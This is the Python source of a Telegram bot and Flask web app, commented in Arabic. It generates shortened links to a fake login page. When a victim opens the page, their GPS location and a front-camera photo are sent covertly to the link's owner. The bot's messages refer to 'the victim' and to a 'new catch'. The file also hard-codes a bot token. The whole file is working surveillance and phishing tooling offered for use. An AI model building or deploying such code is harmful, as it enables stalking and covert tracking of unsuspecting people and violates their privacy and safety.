import telebot
import requests
import base64
from flask import Flask, request, render_template

# --- الإعدادات الأساسية ---
TOKEN = '8313488232:AAFSCmIgCV-ped9mxJFGs3RyRn-A0vw8_Tg'
CHANNEL_ID = '@DroidOnline2'  # معرف قناتك 
BASE_URL = 'https://droidlink.vercel.app' 

bot = telebot.TeleBot(TOKEN, threaded=False)
app = Flask(__name__)

# دالة اختصار الروابط
def shorten(url):
    try:
        res = requests.get(f"https://is.gd/create.php?format=simple&url={url}")
        return res.text if res.status_code == 200 else url
    except:
        return url

# دالة فحص الاشتراك الإجباري
def is_subscribed(user_id):
    try:
        status = bot.get_chat_member(CHANNEL_ID, user_id).status
        return status in ['member', 'administrator', 'creator']
    except Exception as e:
        # إذا واجه البوت مشكلة في الفحص (مثلاً لم يرفع أدمن بعد) سيعطي True لكي لا يتوقف النظام
        return True

# --- معالج الرسائل (Start) ---
@bot.message_handler(commands=['start'])
def start(message):
    user_id = message.from_user.id
    
    # التحقق من الاشتراك
    if not is_subscribed(user_id):
        markup = telebot.types.InlineKeyboardMarkup()
        markup.add(telebot.types.InlineKeyboardButton("📢 اشترك في القناة أولاً", url=f"https://t.me/{CHANNEL_ID.replace('@', '')}"))
        bot.send_message(message.chat.id, f"⚠️ عذراً! يجب عليك الاشتراك في قناة البوت لتتمكن من استخدامه:\n{CHANNEL_ID}", reply_markup=markup)
        return

    # إذا كان مشتركاً تظهر أزرار اللغة
    markup = telebot.types.InlineKeyboardMarkup()
    markup.add(telebot.types.InlineKeyboardButton("🇸🇦 Arabic", callback_data=f"lang_ar_{user_id}"))
    markup.add(telebot.types.InlineKeyboardButton("🇺🇸 English", callback_data=f"lang_en_{user_id}"))
    
    bot.send_message(message.chat.id, "🌐 اختر لغتك / Choose Language:", reply_markup=markup)

# --- معالج الأزرار ---
@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    user_id = call.data.split('_')[-1]
    
    if "lang_" in call.data:
        markup = telebot.types.InlineKeyboardMarkup()
        markup.add(telebot.types.InlineKeyboardButton("➕ إنشاء رابط مراقبة", callback_data=f"gen_{user_id}"))
        bot.edit_message_text("✅ النظام جاهز. اضغط لإنشاء الرابط الخاص بك:", call.message.chat.id, call.message.message_id, reply_markup=markup)
        
    elif "gen_" in call.data:
        # توليد الرابط مع معرف المستخدم (ID) ليعرف البوت لمن يرسل البيانات لاحقاً
        short_link = shorten(f"{BASE_URL}/login?id={user_id}")
        bot.send_message(call.message.chat.id, f"✅ تم تجهيز رابطك بنجاح:\n\n{short_link}\n\n⚠️ ملاحظة: عند فتح الضحية للرابط، ستصلك معلوماته وصورته هنا.")

# --- مسارات الويب (Vercel) ---
@app.route('/login')
def login():
    # هذا المسار يفتح صفحة index.html الموجودة في ملفاتك
    return render_template('index.html')

@app.route('/send_data', methods=['POST'])
def send_data():
    data = request.json
    owner_id = data.get('owner_id')
    
    # إرسال بيانات الموقع الجغرافي
    lat = data.get('lat')
    lon = data.get('lon')
    loc_msg = f"📍 صيد جديد!\nالموقع: https://www.google.com/maps?q={lat},{lon}"
    bot.send_message(owner_id, loc_msg)
    
    # إرسال الصورة الملتقطة من الكاميرا
    if 'img' in data:
        img_data = base64.b64decode(data['img'].split(',')[1])
        bot.send_photo(owner_id, img_data, caption="📸 لقطة الكاميرا الأمامية")
        
    return "ok", 200

@app.route('/', methods=['POST', 'GET'])
def webhook():
    if request.method == 'POST':
        json_string = request.get_data().decode('utf-8')
        update = telebot.types.Update.de_json(json_string)
        bot.process_new_updates([update])
        return "!", 200
    return "Bot is Running", 200

# ربط المسار النهائي
app.add_url_rule('/', endpoint='webhook', view_func=webhook, methods=['POST', 'GET'])
